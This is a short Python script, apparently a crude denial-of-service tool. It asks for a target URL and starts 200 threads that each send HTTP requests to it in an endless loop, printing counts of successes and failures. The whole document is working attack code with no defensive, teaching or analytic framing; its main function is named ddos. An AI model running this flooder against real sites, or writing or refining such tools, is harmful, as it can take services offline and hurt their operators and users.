import threading
from urllib.request import urlopen
import os
attack = 0
done = 0
def ddos(url):
    global attack, done
    while True:
        try:
            response = urlopen(url)
            attack += 1
        except:
            done += 1
        os.system('clear')
        print(f'Attack : {attack}\nDone   : {done}')
url = input('- Enter Url : ')
urls = [url] * 200
threads = []
for url in urls:
    thread = threading.Thread(target=ddos, args=(url,))
    threads.append(thread)
    thread.start()
for thread in threads:
    thread.join()
